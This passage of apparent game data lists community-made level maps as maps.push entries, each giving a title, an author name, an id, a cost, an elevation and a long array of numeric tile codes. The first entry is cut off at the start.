109,109,1,0,8,8,0,1,114,114,1,199,1,199,1,1,1,114,114,185,185,185,114,34,185,185,34,114,114,114,90,114,88,114,90,1,199,114,114,185,185,185,114,34,185,185,34,114,114,114,114,114,114,114,114,199,1,113,113,1,109,109,1,0,8,8,0,1,90,114,114,114,114,114,94,1,199,112,112,1,109,109,199,0,8,8,0,199,114,114,114,87,114,114,114,199,1,111,111,1,90,109,1,0,8,8,0,1,88,114,114,114,114,114,88,1,199,111,111,111,110,109,109,8,8,8,0,199,114,114,114,114,114,114,114,199,1,90,111,111,110,109,109,8,90,8,0,1,90,114,94,114,88,114,90,1,1,1,199,1,199,1,1,1,1,1,1,1,1,199,1,199,1,199,1,1]});
maps.push({name="exactly 5 ladders",author="goober",id="#1693851696",direction="right",cost=394,elevation=19,map=[0,0,0,0,0,1,0,0,0,0,0,2,2,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,67,65,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,65,65,67,0,0,0,1,0,0,0,0,0,1,0,0,0,1,1,0,67,65,65,67,0,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,67,65,65,67,0,0,0,0,67,67,0,1,0,0,0,1,1,1,1,1,1,105,105,1,1,0,0,67,65,65,0,0,0,0,67,1,1,1,105,131,1,105,105,1,1,0,67,65,24,24,1,0,0,67,65,5,1,1,131,96,5,5,5,5,0,0,67,65,24,2,0,0,67,65,5,5,5,1,1,5,5,5,5,5,5,0,67,65,24,2,0,67,65,5,5,5,5,124,124,5,5,5,5,5,1,1,24,24,24,24,67,65,5,5,5,5,3,124,124,3,5,94,5,1,1,1,1,124,124,1,65,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,124,124,124,1,1,1,105,105,105,1,1,1,1,1,1,1,1,1,5,5,24,24,24,24,1,1,105,105,105,1,1,1,1,1,1,1,1,105,5,3,24,24,24,97,67,65,5,5,5,5,1,1,1,1,5,105,105,5,5,5,24,24,132,1,0,67,65,5,5,5,5,124,124,5,5,105,105,5,5,5,24,24,1,1,0,0,67,65,5,5,3,124,124,3,5,65,5,5,65,65,0,24,1,1,0,0,0,67,65,5,5,124,124,5,65,67,65,65,67,67,0,24,24,0,0,0,0,0,67,65,65,1,1,65,67,0,67,67,0,0,0,0,24,93,0,1,0,0,0,67,67,1,1,67,0,0,0,0,0,1,0,0,24,0]});
maps.push({name="Running Up That Hill",author="goober",id="#1693854934",direction="forward",cost=393,elevation=19,map=[0,67,67,67,67,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,1,65,65,65,65,67,0,0,0,0,0,0,0,0,0,0,5,5,0,0,1,1,14,14,14,65,67,0,0,0,1,0,0,0,0,0,5,5,0,1,1,14,14,14,13,13,65,67,0,0,0,0,0,0,0,67,5,5,0,0,14,14,14,13,13,12,12,65,67,0,0,0,0,0,67,65,5,5,0,0,14,14,13,13,12,12,11,11,65,1,1,0,0,67,65,105,105,105,0,0,14,14,13,12,12,11,11,10,10,1,1,1,67,65,105,105,105,1,0,0,14,14,15,12,11,11,10,10,9,9,1,1,1,105,105,105,1,1,0,0,14,15,15,16,11,10,10,9,9,8,8,1,1,105,105,105,1,67,0,0,15,15,16,16,17,10,9,9,8,8,7,7,5,5,5,5,5,65,67,0,15,16,16,17,17,18,9,8,8,7,7,6,6,5,5,5,5,65,67,0,16,16,17,17,18,18,19,8,7,7,6,6,5,5,5,5,65,67,0,0,65,17,17,18,18,19,19,20,7,6,6,5,5,5,5,65,67,0,0,0,67,65,18,18,19,19,20,20,21,6,5,5,5,5,65,67,0,0,0,1,0,67,65,19,19,20,20,21,21,22,5,5,5,65,67,0,0,67,0,0,0,1,67,65,20,20,21,21,22,22,23,5,65,67,0,0,67,65,67,0,0,0,0,67,65,21,21,22,22,23,23,24,24,24,124,124,24,24,65,67,0,0,0,0,67,65,22,22,23,23,24,24,24,24,124,124,24,24,24,24,0,1,0,0,1,67,65,23,23,24,24,24,24,1,1,1,1,24,24,24,0,0,0,0,0,0,67,1,24,24,24,24,1,1,1,1,1,1,2,2]});
maps.push({name="musicjpg",author="goober",id="#1693944091",direction="right",cost=138,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,1,0,0,0,0,1,5,5,5,1,5,5,5,5,1,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,1,5,5,5,5,1,5,1,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,5,1,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,1,5,0,0,0,0,0,0,0,0,5,5,1,1,5,2,0,0,0,0,5,5,0,0,0,0,0,0,0,0,1,5,1,1,5,2,0,0,0,0,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,1,5,5,1,5,5,5,5,5,1,5,5,5,5,5,0,0,0,0,0,1,1,5,5,5,5,1,5,5,5,5,5,5,1,0,0]});
maps.push({name="Breach The Tower",author="goober",id="#1693950806",direction="left",cost=357,elevation=19,map=[0,0,0,0,1,1,0,0,0,0,1,1,1,0,0,0,2,2,0,0,0,0,0,0,20,20,0,0,0,0,15,15,1,0,67,65,105,105,65,67,0,0,0,0,125,125,0,0,0,0,125,125,0,0,67,65,105,105,65,67,0,67,0,0,0,0,0,0,0,0,0,0,0,0,67,65,105,105,65,67,20,65,67,0,0,0,0,0,0,0,0,0,0,0,67,65,105,105,65,67,20,65,67,0,0,0,0,0,0,0,0,0,0,0,1,1,5,5,65,67,20,125,0,0,0,0,0,0,0,0,0,125,10,1,1,1,105,5,65,67,20,125,0,0,0,0,0,0,0,0,0,125,10,1,1,105,105,105,65,67,20,125,0,0,0,0,0,0,0,0,0,10,10,1,105,105,105,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,105,65,67,0,0,0,0,67,67,67,0,0,0,125,0,0,67,5,5,5,1,67,0,0,0,0,1,65,65,65,1,5,5,5,0,67,65,5,5,5,1,1,0,0,0,1,124,24,24,24,124,1,5,5,67,65,5,5,5,5,1,1,0,0,0,24,124,124,124,124,124,24,5,5,65,5,5,5,5,65,67,0,0,0,0,2,124,93,1,97,124,24,5,5,5,5,5,5,65,67,0,0,0,0,0,2,124,94,1,132,124,24,5,5,5,5,5,65,67,0,0,0,0,0,0,24,124,124,124,124,124,24,5,5,65,65,65,67,0,0,0,0,0,0,1,1,124,24,24,24,124,1,96,96,67,67,67,0,0,0,0,0,0,1,1,0,1,65,65,65,1,5,96,96,0,0,0,0,0,0,0,0,1,1,1,0,0,67,67,67,0,5,131,96,0,0,0,0,0,0,0,1,1,1,1]});
maps.push({name="The Throne",author="NyaaaDoge",id="#1694005328",direction="forward",cost=308,elevation=3,map=[0,0,0,0,0,14,14,14,11,2,2,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,87,14,11,11,11,14,87,14,14,14,0,0,0,0,0,0,14,37,37,14,14,90,31,31,31,90,14,14,37,37,14,0,0,0,0,14,37,19,19,37,14,14,45,45,45,14,14,37,19,19,37,14,0,0,0,14,37,19,19,37,48,14,45,132,45,14,48,37,19,19,37,14,0,0,0,14,14,37,37,14,48,14,45,45,45,14,48,14,37,37,14,14,0,0,0,14,14,14,14,48,131,14,93,93,93,14,48,48,14,14,14,14,0,0,0,14,14,14,14,48,48,14,45,93,45,14,131,48,14,14,14,14,0,0,0,14,14,37,37,14,48,14,93,93,93,14,48,14,37,37,14,14,0,0,0,14,37,19,19,37,48,14,45,133,45,14,48,37,19,19,37,14,0,0,0,14,37,19,19,37,14,14,45,45,45,14,14,37,19,19,37,14,0,0,0,14,14,37,37,14,14,14,46,46,46,14,14,14,37,37,14,14,0,0,0,14,14,14,14,14,40,14,47,47,47,14,40,14,14,14,14,14,0,0,0,0,14,14,87,14,22,16,16,16,16,16,22,14,87,14,14,0,0,0,0,0,14,14,14,14,40,18,18,18,18,18,40,14,14,14,14,0,0,0,0,0,0,14,90,14,40,18,18,134,18,18,40,14,90,14,0,0,0,0,0,0,0,14,14,14,40,18,94,88,94,18,40,14,14,14,0,0,0,0,0,0,0,0,14,14,24,1,1,1,1,1,24,14,14,0,0,0,0,0,0,0,0,0,14,90,14,14,14,14,14,14,14,90,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,2,2,14,14,14,0,0,0,0,0,0]});
maps.push({name="yi yan ding zhen",author="TheShy",id="#1694013185",direction="forward",cost=155,elevation=0,map=[0,0,0,0,100,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,5,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,5,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,5,0,0,0,0,0,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,100,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,5,0,0,5,94,94,5,94,94,5,94,94,5,0,0,0,0,0,0,0,5,0,0,5,5,5,5,5,5,5,5,5,5,0,5,0,5,5,5,5,5,0,5,0,0,0,0,0,0,0,0,0,0,0,5,0,5,93,93,93,5,5,0,5,5,5,5,5,5,5,5,5,5,0,5,0,5,93,93,93,5,0,0,5,0,5,0,5,5,0,0,0,5,5,5,5,5,93,93,93,5,0,0,5,0,5,0,5,0,5,0,5,0,0,5,0,5,93,93,93,5,5,0,5,0,5,0,5,0,0,5,0,0,0,5,0,5,5,5,5,5,0,5,100,5,5,5,5,0,5,0,5,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,5,2,2]});
maps.push({name="hole in the wall",author="goober",id="#1694030202",direction="forward",cost=116,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,15,15,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,115,115,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,115,115,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,15,15,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Gris Spawn Room",author="Squilliam Fancyson",id="#1694030898",direction="forward",cost=382,elevation=1,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,1,1,18,17,16,15,14,13,12,9998,11,11,9998,12,13,14,15,16,17,18,1,1,18,17,16,15,14,13,12,9998,11,11,9998,12,13,14,15,16,17,18,1,1,10,10,10,10,10,10,10,11,11,11,11,10,10,10,10,10,10,10,1,1,18,17,16,15,14,13,12,9998,11,11,9998,12,13,14,15,16,17,18,1,1,18,17,16,15,14,13,12,9998,11,11,9998,12,13,14,15,16,17,18,1,1,10,10,10,10,10,10,10,11,11,11,11,10,10,10,10,10,10,10,1,1,18,17,16,15,14,13,12,9998,11,11,9998,12,13,14,15,16,17,18,1,1,18,17,16,15,14,13,12,9998,9998,9998,9998,12,13,14,15,16,17,18,1,1,11,11,11,11,11,11,9998,12,12,12,12,9998,11,11,11,11,11,11,1,1,11,11,11,11,11,11,11,13,13,13,13,11,11,11,11,11,11,11,1,1,11,11,11,11,11,11,11,14,14,14,14,11,11,11,11,11,11,11,1,1,11,11,11,11,11,11,11,15,15,15,15,11,11,11,11,11,11,11,1,1,11,11,11,11,11,11,11,16,16,16,16,11,11,11,11,11,11,11,1,1,11,11,11,11,11,11,11,16,16,16,16,11,11,11,11,11,11,11,1,1,11,11,11,11,11,11,1,9,1,1,9,1,11,11,11,11,11,11,1,1,11,11,11,11,11,11,1,93,1,1,93,1,11,11,11,11,11,11,1,1,11,11,11,11,11,11,1,11,1,1,11,1,11,11,11,11,11,11,1,1,11,11,2,2,11,11,11,11,11,11,11,11,11,11,11,11,11,11,1]});
maps.push({name="LIQUIIIIIIID",author="goober",id="#1694031063",direction="left",cost=499,elevation=0,map=[24,24,65,24,24,65,24,24,24,24,24,24,65,67,0,0,2,2,0,0,65,65,67,67,67,67,65,65,65,65,24,24,65,67,0,5,5,5,67,0,67,67,0,0,0,0,67,67,67,65,24,24,65,67,0,5,5,5,65,67,0,0,0,5,5,0,0,0,67,65,24,24,65,67,0,5,5,5,65,67,2,5,5,5,5,5,0,0,67,65,24,24,65,67,0,5,5,5,65,67,2,5,5,5,5,5,5,0,67,65,24,24,65,67,0,5,5,5,65,67,0,0,0,67,65,5,5,0,67,65,24,65,67,0,0,5,5,5,65,67,67,0,0,0,67,5,5,0,0,67,65,67,0,0,5,5,5,5,65,67,65,67,0,0,0,5,5,0,0,0,67,0,0,5,5,5,5,65,67,0,24,65,67,0,0,5,5,0,0,0,0,0,5,5,5,5,65,67,0,0,24,65,67,0,5,5,5,0,0,0,0,5,5,5,5,65,67,0,0,67,24,65,67,0,5,5,5,0,0,0,0,5,5,5,65,67,0,0,67,65,24,65,67,0,5,5,5,0,0,1,1,105,105,1,1,0,0,67,65,24,24,65,67,0,5,5,5,0,1,1,1,105,105,1,1,1,0,0,67,24,24,65,67,0,5,5,5,0,1,1,1,105,105,1,1,1,0,0,67,24,24,65,67,0,5,5,5,0,0,1,1,105,105,1,1,65,67,0,67,24,24,65,67,0,5,5,5,5,5,5,5,5,5,5,5,65,67,0,67,24,24,65,67,0,0,5,5,5,5,5,5,5,5,5,65,67,0,0,67,24,65,67,0,0,0,67,65,65,65,65,65,65,65,65,67,0,0,67,65,24,67,0,0,0,0,0,67,67,67,67,67,67,67,67,0,0,67,65,24,24]});
maps.push({name="Tall ceiling place",author="Luffaren",id="#1694031458",direction="forward",cost=284,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,89,5,5,89,5,5,5,5,0,0,0,0,0,0,0,0,5,24,24,24,24,95,95,24,24,24,24,5,0,0,0,0,0,0,0,0,6,24,105,99,105,105,105,105,99,105,24,6,0,0,0,0,0,0,0,0,7,24,185,185,185,185,185,185,185,185,24,7,0,0,0,0,0,0,0,0,8,24,185,185,185,185,185,185,185,185,24,8,0,0,0,0,0,0,0,0,9,24,185,185,185,185,185,185,185,185,24,9,0,0,0,0,0,0,0,0,10,24,185,185,185,185,185,185,185,185,24,10,0,0,0,0,0,0,0,0,11,24,185,185,185,185,185,185,185,185,24,11,0,0,0,0,0,0,0,0,12,24,185,185,185,185,185,185,185,185,24,12,0,0,0,0,0,0,0,0,12,24,185,185,185,185,185,185,185,185,24,12,0,0,0,0,0,0,0,0,96,24,185,185,185,185,185,185,185,185,24,96,0,0,0,0,0,0,0,0,96,24,99,105,105,105,105,105,105,99,24,96,0,0,0,0,0,0,0,0,12,24,9998,24,24,98,98,24,24,9998,24,12,0,0,0,0,0,0,32,93,12,8,8,8,97,5,5,97,8,8,8,12,93,32,0,0,0,0,145,32,0,0,0,0,5,5,5,5,0,0,0,0,32,145,0,0,0,0,0,0,0,0,0,0,89,5,5,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="ze Rockwall Climbing",author="goober",id="#1694032042",direction="left",cost=397,elevation=19,map=[0,0,0,0,1,0,0,19,19,19,0,1,1,0,0,0,2,2,67,0,0,0,24,23,22,21,20,19,97,19,19,1,1,0,0,0,5,5,65,67,0,24,24,23,22,21,20,19,19,19,19,1,1,0,0,0,5,5,65,67,24,24,0,1,1,1,1,119,119,119,119,1,1,1,0,0,5,5,65,67,24,24,0,1,1,1,1,119,119,119,1,1,1,1,1,0,5,5,65,67,2,24,0,0,1,19,19,19,19,1,1,1,1,1,1,5,5,5,65,67,2,24,0,0,0,19,19,19,19,19,1,1,1,1,105,5,5,5,65,67,24,24,24,0,0,0,19,19,19,19,19,1,1,105,105,105,5,5,65,67,24,24,24,0,0,0,0,19,141,141,19,1,105,105,105,105,105,1,67,0,24,132,24,0,0,0,67,14,14,14,14,5,5,105,105,105,1,1,0,0,1,1,1,0,0,67,65,14,14,14,5,5,5,5,105,1,1,1,0,0,1,1,0,0,67,65,14,14,14,14,5,5,5,5,1,1,1,1,0,0,1,0,0,67,65,14,14,14,14,5,5,5,5,65,67,0,0,0,0,0,0,0,67,65,14,14,14,14,14,5,5,5,65,67,0,0,0,0,0,0,0,0,67,65,14,14,14,141,5,5,5,65,67,0,0,0,0,0,0,0,0,0,67,65,14,14,14,4,5,5,5,65,67,0,0,1,1,1,1,0,0,0,67,65,14,14,14,141,5,5,5,5,5,5,5,105,96,131,105,0,0,0,67,65,14,14,14,4,5,5,5,5,5,5,5,105,96,131,105,0,0,0,0,67,65,14,14,141,5,5,65,65,65,65,67,1,1,1,1,0,0,0,0,0,67,14,14,14,0,0,67,67,67,67,0,0,0,0,0,0]});
maps.push({name="Virtual Insanity",author="goober",id="#1694047665",direction="forward",cost=374,elevation=0,map=[0,0,0,24,65,67,0,0,0,0,2,2,0,0,0,0,67,65,24,0,0,0,0,24,65,67,0,0,5,5,5,5,5,5,0,0,67,65,24,0,0,0,0,24,65,67,0,0,94,5,5,5,5,94,0,0,67,65,24,0,0,0,0,24,65,67,0,0,0,1,105,105,1,0,0,0,67,65,24,0,0,0,0,24,65,67,0,0,0,1,105,105,1,0,0,0,67,65,24,0,0,0,0,24,65,67,0,0,0,1,105,105,1,0,0,0,67,65,24,0,0,0,0,24,65,67,0,1,1,1,105,105,1,1,1,0,67,65,24,0,0,0,0,24,65,67,0,1,105,105,105,105,105,105,1,0,67,65,24,0,0,0,0,24,65,67,0,1,105,105,105,105,105,105,1,0,67,65,24,0,0,0,0,24,65,67,0,1,105,105,105,105,105,90,1,0,67,65,24,0,0,0,0,24,65,67,0,143,105,105,105,105,105,105,143,0,67,65,24,0,0,0,0,24,65,67,0,143,105,105,105,105,105,105,143,0,67,65,24,0,0,0,0,24,65,67,0,1,90,105,105,105,105,105,1,0,67,65,24,0,0,0,0,24,65,67,0,1,1,1,105,105,1,1,1,0,67,65,24,0,0,0,0,24,65,67,0,1,1,1,105,105,1,1,1,0,67,65,24,0,0,0,0,24,65,67,0,1,105,105,105,105,105,105,1,0,67,65,24,0,0,0,0,24,65,67,0,1,105,1,1,1,1,105,1,0,67,65,24,0,0,0,0,24,65,67,0,0,5,5,5,5,5,5,0,0,67,65,24,0,0,0,0,24,65,67,0,0,5,5,5,5,5,5,0,0,67,65,24,0,0,0,0,24,65,67,0,0,0,0,2,2,0,0,0,0,67,65,24,0]});
maps.push({name="Leap of Faith",author="goober",id="#1694048773",direction="forward",cost=276,elevation=-19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,143,124,124,124,124,143,0,0,0,0,1,1,0,1,1,1,1,0,0,1,124,124,124,124,124,124,1,0,0,1,1,1,1,124,131,96,124,24,24,124,124,124,1,1,124,124,124,24,24,124,96,131,124,124,131,96,124,24,24,124,124,124,1,1,124,124,124,24,24,124,96,131,124,1,1,1,1,0,0,1,124,124,124,124,124,124,1,0,0,1,1,1,1,0,0,0,0,0,0,0,143,124,124,124,124,143,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,67,0,0,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,1,5,5,5,5,5,65,65,65,65,65,65,5,5,5,5,5,1,1,1,1,5,5,5,97,5,5,65,65,65,65,5,5,132,5,5,5,1,1,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0]});
maps.push({name="Deadly Tightrope",author="goober",id="#1694049482",direction="right",cost=299,elevation=0,map=[0,0,0,5,1,1,1,1,5,5,0,0,0,0,0,0,2,2,0,0,0,0,0,5,5,1,1,5,5,5,0,0,0,0,0,0,5,5,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,0,0,5,5,5,5,132,5,5,5,5,105,1,1,0,0,0,5,5,5,0,0,5,5,5,5,5,5,5,5,105,105,105,1,0,0,5,5,5,5,0,0,1,105,1,5,5,1,1,1,1,105,105,105,5,5,5,5,5,0,0,0,1,96,1,5,5,1,1,1,1,1,105,5,5,5,5,5,0,0,0,0,1,136,1,5,5,1,1,1,1,0,0,5,5,5,0,0,0,0,0,1,1,105,1,5,5,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,0,1,0,131,131,0,1,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,5,97,5,5,5,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,5,137,5,5,5,0,0,0,131,131,0,0,0,0,0,0,0,0,0,0,5,5,5,5,2,0,0,0,131,131,0,1,1,1,0,0,0,0,0,0,0,0,5,5,2,1,0,0,131,131,0,1,1,1,0,0,0,0,0,0,0,0,0,5,5,1,1,0,131,131,0,5,134,5,0,0,0,0,0,0,0,0,0,5,5,1,1,1,5,5,5,5,5,5,5,133,133,133,133,133,133,133,133,5,5,1,1,1,5,5,5,5,5,5,5,133,133,133,133,133,133,133,133,5,5]});
maps.push({name="The Fountain",author="sivi",id="#1694117052",direction="forward",cost=339,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,1,5,5,5,1,34,34,0,0,0,0,0,0,0,0,0,0,1,90,5,5,5,5,5,5,5,90,1,0,0,0,0,0,0,0,0,34,5,9998,9998,9998,9998,9998,9998,9998,9998,9998,5,34,0,0,0,0,0,0,1,5,9998,6,6,6,6,6,6,6,6,6,9998,5,1,0,0,0,0,34,90,9998,6,6,65,65,65,65,65,65,65,6,6,9998,90,34,0,0,0,34,5,9998,6,65,65,7,7,67,7,7,65,65,6,9998,5,34,0,0,3,1,5,9998,6,65,7,7,65,65,65,7,7,65,6,9998,5,1,3,0,0,34,5,9998,6,65,7,65,65,67,65,65,7,65,6,9998,5,34,0,0,0,93,5,9998,6,65,67,65,67,65,67,65,67,65,6,9998,5,93,0,0,0,34,5,9998,6,65,7,65,65,67,65,65,7,65,6,9998,5,34,0,0,3,1,5,9998,6,65,7,7,65,65,65,7,7,65,6,9998,5,1,3,0,0,34,5,9998,6,65,65,7,7,67,7,7,65,65,6,9998,5,34,0,0,0,34,90,9998,6,6,65,65,65,65,65,65,65,6,6,9998,90,34,0,0,0,0,1,5,9998,6,6,6,6,6,6,6,6,6,9998,5,1,0,0,0,0,0,0,34,5,9998,9998,9998,9998,9998,9998,9998,9998,9998,5,34,0,0,0,0,0,0,0,0,1,90,5,5,5,5,5,5,5,90,1,0,0,0,0,0,0,0,0,0,0,34,34,1,5,5,5,1,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lava Tunnel",author="sivi",id="#1694300682",direction="right",cost=323,elevation=0,map=[1,1,1,1,2,2,109,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,9998,9998,183,9,49,0,77,0,0,0,77,0,0,0,77,0,1,1,77,0,90,9,183,9,90,0,189,0,0,183,0,183,0,183,0,0,1,1,0,0,49,9,183,9,49,0,36,0,186,33,186,32,186,31,186,0,1,1,0,0,15,9,183,9,15,0,93,0,15,49,90,49,15,49,90,49,1,1,0,0,49,9,183,9,49,0,189,0,49,9,9,9,9,9,9,9,109,1,77,0,90,9,183,9,90,0,36,0,90,9,183,183,183,183,183,183,2,1,0,0,49,9,183,9,49,0,93,0,49,9,183,9,9,9,9,9998,2,1,0,0,15,9,183,9,15,0,189,0,15,9,183,9,15,49,90,9998,1,1,0,0,49,9,183,9,49,0,36,0,49,9,183,9,49,0,0,0,1,1,77,0,90,9,183,9,90,0,93,0,90,9,183,9,90,0,0,77,1,1,0,0,49,9,183,9,49,0,0,0,49,9,183,9,49,0,0,0,1,1,0,0,15,9,183,9,15,49,90,49,15,9,183,9,15,0,0,0,1,1,0,0,49,9,183,9,9,9,9,9,9,9,183,9,49,0,0,0,1,1,77,0,90,9,183,183,183,183,183,183,183,183,183,9,90,0,0,77,1,1,0,0,49,9,9,9,9,9,9,9,9,9,9,9,49,0,0,0,1,1,0,0,15,49,90,49,15,49,90,49,15,49,90,49,15,0,0,0,1,1,154,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,155,153,1,1,9,186,0,0,77,0,0,0,77,0,0,0,77,0,0,0,187,8,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Carnival",author="sivi",id="#1694384231",direction="left",cost=371,elevation=10,map=[1,2,2,114,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,114,114,114,114,0,0,0,0,0,0,0,0,0,114,90,1,1,0,0,1,90,114,114,114,0,179,0,0,180,0,0,181,0,114,114,114,1,1,0,1,114,114,114,114,0,170,0,0,170,0,0,170,0,114,114,114,114,1,1,1,114,114,90,114,0,170,0,0,170,0,0,170,0,114,114,114,114,88,1,1,114,114,114,114,0,191,0,0,190,0,0,182,0,114,114,114,90,114,1,1,90,94,94,114,0,0,0,0,0,0,0,0,0,90,114,114,114,114,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,113,113,113,1,1,1,1,1,0,0,189,5,90,88,5,5,88,5,90,12,12,12,12,1,1,124,90,124,169,177,14,5,5,5,5,90,5,5,93,12,12,12,88,1,1,124,124,124,0,0,189,5,5,5,5,5,5,5,93,11,90,11,11,1,1,90,124,124,169,173,5,5,5,5,5,5,5,5,90,11,11,11,11,1,124,124,124,124,0,0,189,5,5,90,5,5,5,88,10,10,10,10,10,1,2,124,124,124,169,176,24,5,5,5,5,5,5,90,10,10,10,90,10,1,2,124,124,124,0,0,189,5,5,5,5,5,5,8,9,9,9,9,9,1,1,90,124,124,169,174,5,5,90,5,5,90,5,8,90,9,9,9,88,1,1,124,124,124,0,0,189,5,5,5,5,6,7,8,9,9,9,9,1,1,1,124,90,124,169,175,14,5,5,5,5,6,7,8,9,9,90,1,1,0,1,1,1,1,0,0,0,5,5,5,90,6,7,90,88,9,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0]});
